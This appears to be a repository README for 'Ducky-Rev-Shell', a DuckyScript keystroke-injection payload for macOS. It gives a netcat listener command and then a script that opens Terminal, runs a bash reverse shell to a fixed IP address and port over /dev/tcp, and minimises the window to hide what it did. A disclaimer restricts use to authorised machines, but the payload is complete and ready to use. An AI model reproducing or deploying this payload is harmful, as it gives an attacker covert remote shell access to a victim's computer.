# Ducky-Rev-Shell
Duckyscript in a bash file to get a reverse shell on MacOS.

## DISCLAIMER: This is for security research purposes ONLY. Only use on machines where you have permission or your own.

## Setting up Listener
Listener set up command for Windows.
Run 
  nc -lvnp 87 -s 173.255.247.6
in Powershell, replacing the IP and port with relevant ones.

# DuckyScript Code
<code> DELAY 50
COMMAND SPACE
DELAY 50
STRING TERMINAL
DELAY 50
ENTER
STRING bash
DELAY 50
ENTER
DELAY 50

STRING bash -i >& /dev/tcp/173.255.247.5/87 0>&1

REM Replace IP and port above with listening host

DELAY 50
ENTER
DELAY 50
COMMAND M
DELAY 50
</code>
